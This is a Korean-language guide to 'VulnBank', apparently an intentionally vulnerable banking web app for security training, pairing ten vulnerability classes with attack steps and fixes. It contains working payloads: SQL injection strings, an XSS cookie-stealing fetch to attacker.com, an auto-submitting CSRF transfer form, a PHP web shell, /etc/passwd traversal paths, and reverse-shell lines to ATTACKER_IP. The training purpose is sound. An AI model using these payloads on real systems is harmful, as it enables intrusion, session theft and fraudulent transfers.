# 🔓 VulnBank 취약점 상세 가이드

이 문서는 VulnBank에 포함된 각 취약점에 대한 상세한 설명, 공격 방법, 그리고 수정 방법을 제공합니다.

---

## 1. 🔴 SQL Injection

### 위치
- `/login` - 로그인 페이지
- `/register` - 회원가입 페이지  
- `/search` - 검색 기능

### 취약한 코드
```python
# app.py - login 함수
query = f"SELECT * FROM users WHERE username='{username}' AND password='{hashlib.md5(password.encode()).hexdigest()}'"
cursor.execute(query)
```

### 공격 방법
1. **인증 우회**
   - 아이디: `' OR '1'='1'--`
   - 비밀번호: 아무거나

2. **Union 기반 공격** (검색 페이지)
   ```
   ' UNION SELECT 1,username,password,email,balance,is_admin,7,8 FROM users--
   ```

3. **Error 기반 공격**
   ```
   ' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--
   ```

### 수정 방법
```python
# Parameterized Query 사용
cursor.execute("SELECT * FROM users WHERE username=? AND password=?", 
               (username, password_hash))
```

---

## 2. 🟠 XSS (Cross-Site Scripting)

### Reflected XSS
**위치**: `/search?q=`

**공격 페이로드**:
```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg/onload=alert('XSS')>
```

**쿠키 탈취**:
```html
<script>
fetch('http://attacker.com/steal?c='+document.cookie)
</script>
```

### Stored XSS
**위치**: 공지사항 작성, 송금 메모

**공격 시나리오**:
1. 공지사항에 악성 스크립트 삽입
2. 다른 사용자가 공지사항 열람 시 스크립트 실행
3. 세션 쿠키 탈취 또는 피싱 페이지 로드

### 수정 방법
```html
<!-- Jinja2 자동 이스케이프 사용 -->
{{ user_input }}  <!-- 자동 이스케이프 -->
{{ user_input | safe }}  <!-- 위험! 제거 필요 -->
```

---

## 3. 🟡 CSRF (Cross-Site Request Forgery)

### 취약 엔드포인트
- `/transfer` - 송금
- `/change-password` - 비밀번호 변경

### 공격 HTML
```html
<!-- 악성 웹사이트에 삽입 -->
<html>
<body>
<h1>축하합니다! 경품에 당첨되셨습니다!</h1>
<form action="http://vulnbank.com/transfer" method="POST" id="csrf">
    <input type="hidden" name="to_username" value="attacker" />
    <input type="hidden" name="amount" value="100000" />
    <input type="hidden" name="memo" value="CSRF" />
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

### 수정 방법
```python
from flask_wtf import CSRFProtect
csrf = CSRFProtect(app)

# 템플릿에서
<form method="POST">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
</form>
```

---

## 4. 🟢 IDOR (Insecure Direct Object Reference)

### 취약 엔드포인트
- `/account/<user_id>` - 계좌 조회
- `/message/<message_id>` - 메시지 조회
- `/api/user/<user_id>` - API

### 공격 방법
1. 자신의 계좌 페이지 URL 확인: `/account/3`
2. user_id를 1로 변경: `/account/1`
3. 관리자 계좌 정보 노출!

### 수정 방법
```python
@app.route('/account/<int:user_id>')
def account(user_id):
    # 권한 검사 추가
    if session['user_id'] != user_id and not session.get('is_admin'):
        return '접근 권한이 없습니다.', 403
    # ...
```

---

## 5. 🔵 파일 업로드 취약점

### 위치
`/profile` - 프로필 사진 업로드

### 공격 방법
1. 웹쉘 파일 생성 (shell.php):
   ```php
   <?php system($_GET['cmd']); ?>
   ```

2. 프로필 사진으로 업로드

3. 업로드된 파일 접근:
   ```
   /uploads/shell.php?cmd=whoami
   ```

### 수정 방법
```python
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# 파일 시그니처도 검사
import magic
def validate_image(file):
    mime = magic.from_buffer(file.read(1024), mime=True)
    return mime.startswith('image/')
```

---

## 6. 🟣 디렉토리 트래버설

### 위치
- `/download?file=` - 파일 다운로드
- `/uploads/<filename>` - 업로드 파일 접근

### 공격 페이로드
```
/download?file=../app.py
/download?file=../../../etc/passwd
/download?file=....//....//etc/passwd  (필터 우회)
/download?file=..%2f..%2f..%2fetc/passwd  (URL 인코딩)
```

### 수정 방법
```python
import os

@app.route('/download')
def download():
    filename = request.args.get('file', '')
    
    # 경로 정규화
    safe_path = os.path.normpath(filename)
    
    # 상위 디렉토리 접근 차단
    if '..' in safe_path or safe_path.startswith('/'):
        return '잘못된 파일 경로입니다.', 400
    
    # 화이트리스트 검사
    allowed_files = ['terms.txt', 'privacy.txt']
    if safe_path not in allowed_files:
        return '파일을 찾을 수 없습니다.', 404
```

---

## 7. ⚫ 커맨드 인젝션

### 위치
- `/admin/server-status` - 서버 상태 확인
- `/admin/dns-lookup` - DNS 조회

### 공격 페이로드
```bash
# Linux
localhost; cat /etc/passwd
localhost && id
localhost | whoami
$(whoami)
`id`

# Windows  
localhost & dir
localhost | type C:\Windows\win.ini
```

### 리버스 쉘
```bash
localhost; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
localhost; nc -e /bin/sh ATTACKER_IP 4444
```

### 수정 방법
```python
import subprocess

# 취약한 코드
result = subprocess.check_output(f'ping -c 1 {host}', shell=True)

# 안전한 코드
result = subprocess.check_output(['ping', '-c', '1', host])
```

---

## 8. 🔐 인증/세션 취약점

### 취약점 목록
1. **약한 시크릿 키**: `secret123`
2. **쿠키 기반 인증**: `user_role=admin`
3. **HttpOnly 미설정**: JavaScript로 쿠키 접근 가능
4. **Secure 미설정**: HTTP로 쿠키 전송

### 쿠키 조작으로 관리자 접근
```javascript
// 브라우저 콘솔에서 실행
document.cookie = "user_role=admin"
// 그 후 /admin 페이지 접속
```

### 수정 방법
```python
# 강력한 시크릿 키
import secrets
app.secret_key = secrets.token_hex(32)

# 안전한 쿠키 설정
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True  # HTTPS 필수
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
```

---

## 9. 📢 정보 노출

### 노출되는 정보
- 에러 메시지에 SQL 쿼리 노출
- 스택 트레이스 노출
- HTML 주석에 서버 정보
- 디버그 모드 활성화
- API 엔드포인트에서 민감정보 노출

### 수정 방법
```python
# 디버그 모드 비활성화
app.run(debug=False)

# 커스텀 에러 핸들러
@app.errorhandler(500)
def server_error(e):
    return render_template('error.html', 
                          error='서버 오류가 발생했습니다.'), 500
```

---

## 10. 🔑 약한 암호화

### 문제점
- MD5 해시 사용 (레인보우 테이블 공격에 취약)
- 솔트 미사용

### 수정 방법
```python
from werkzeug.security import generate_password_hash, check_password_hash

# 비밀번호 해시
hashed = generate_password_hash(password, method='pbkdf2:sha256')

# 비밀번호 검증
check_password_hash(stored_hash, password)
```

---

## 📝 테스트 체크리스트

- [ ] SQL Injection으로 로그인 우회
- [ ] Reflected XSS 실행
- [ ] Stored XSS 저장 및 실행
- [ ] CSRF로 송금 수행
- [ ] IDOR로 다른 사용자 정보 조회
- [ ] 웹쉘 업로드 및 실행
- [ ] 디렉토리 트래버설로 /etc/passwd 읽기
- [ ] 커맨드 인젝션으로 시스템 명령 실행
- [ ] 쿠키 조작으로 관리자 접근
- [ ] API에서 민감정보 수집

---

**⚠️ 주의: 이 기술들은 합법적인 테스트 환경에서만 사용하세요!**










